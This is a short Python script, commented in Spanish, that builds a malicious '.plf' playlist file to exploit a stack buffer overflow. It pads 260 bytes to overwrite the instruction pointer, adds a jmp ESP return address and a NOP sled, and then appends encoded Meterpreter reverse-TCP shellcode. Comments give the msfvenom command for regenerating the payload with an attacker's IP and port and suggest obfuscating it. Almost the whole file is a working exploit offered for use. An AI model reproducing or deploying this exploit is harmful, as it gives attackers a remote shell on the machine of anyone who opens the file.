#!/usr/bin/python

archivo = open("exploit.plf", "wb")

buffer = "A" * 260  #Codigo basura para alcanzar el registro EPI
buffer +="\xEF\x27\x09\x75"  #Direccion a la que apunta jmp ESP 
buffer +="\x90" * 60 #Nops  para suplir la diferencia de bytes
buffer +=("\xb8\x9e\xfd\xf6\xd7\xda\xcb\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x54\x31\x45\x13\x03\x45\x13\x83\xc5\x9a\x1f\x03\x2b\x4a\x5d"
"\xec\xd4\x8a\x02\x64\x31\xbb\x02\x12\x31\xeb\xb2\x50\x17\x07"
"\x38\x34\x8c\x9c\x4c\x91\xa3\x15\xfa\xc7\x8a\xa6\x57\x3b\x8c"
"\x24\xaa\x68\x6e\x15\x65\x7d\x6f\x52\x98\x8c\x3d\x0b\xd6\x23"
"\xd2\x38\xa2\xff\x59\x72\x22\x78\xbd\xc2\x45\xa9\x10\x59\x1c"
"\x69\x92\x8e\x14\x20\x8c\xd3\x11\xfa\x27\x27\xed\xfd\xe1\x76"
"\x0e\x51\xcc\xb7\xfd\xab\x08\x7f\x1e\xde\x60\x7c\xa3\xd9\xb6"
"\xff\x7f\x6f\x2d\xa7\xf4\xd7\x89\x56\xd8\x8e\x5a\x54\x95\xc5"
"\x05\x78\x28\x09\x3e\x84\xa1\xac\x91\x0d\xf1\x8a\x35\x56\xa1"
"\xb3\x6c\x32\x04\xcb\x6f\x9d\xf9\x69\xfb\x33\xed\x03\xa6\x5b"
"\xc2\x29\x59\x9b\x4c\x39\x2a\xa9\xd3\x91\xa4\x81\x9c\x3f\x32"
"\xe6\xb6\xf8\xac\x19\x39\xf9\xe5\xdd\x6d\xa9\x9d\xf4\x0d\x22"
"\x5e\xf9\xdb\xdf\x5b\x6d\x24\xb7\x65\x66\xcc\xca\x65\x5a\xb4"
"\x42\x83\xca\x94\x04\x1c\xaa\x44\xe5\xcc\x42\x8f\xea\x33\x72"
"\xb0\x20\x5c\x18\x5f\x9d\x34\xb4\xc6\x84\xcf\x25\x06\x13\xaa"
"\x65\x8c\x96\x4a\x2b\x65\xd2\x58\x5b\x14\x1c\xa1\x9b\xbd\x1c"
"\xcb\x9f\x17\x4a\x63\x9d\x4e\xbc\x2c\x5e\xa5\xbe\x2b\xa0\x38"
"\xf7\x40\x96\xae\xb7\x3e\xd6\x3e\x38\xbf\x80\x54\x38\xd7\x74"
"\x0d\x6b\xc2\x7b\x98\x1f\x5f\xe9\x23\x76\x33\xba\x4b\x74\x6a"
"\x8c\xd3\x87\x59\x8f\x14\x77\x1f\xad\xbc\x10\xdf\xf1\x3c\xe1"
"\xb5\xf1\x6c\x89\x42\xde\x83\x79\xaa\xf5\xcb\x11\x21\x9b\xbe"
"\x80\x36\xb6\x1f\x1d\x36\x34\x84\x48\xb9\xbb\x3b\x75\x3b\x80"
"\xed\x4c\x49\xc1\x2d\xeb\x42\x78\x13\x5a\xc9\x82\x07\x9c\xd8")
#shellcode reverse_tcp, modificar con el comando
#msfvenom -p windows/meterpreter/reveser_tcp lhost=<ip atacante>  lport=<puerto atacante> -f c -a x86 -b "\x00\x0a\x1a"
#Encoder o diferentes tecnicar de ofuscacion pueden ser aplicadas
archivo.write(buffer) #Escribimos en archivo
archivo.close() #Cerramos el archivo

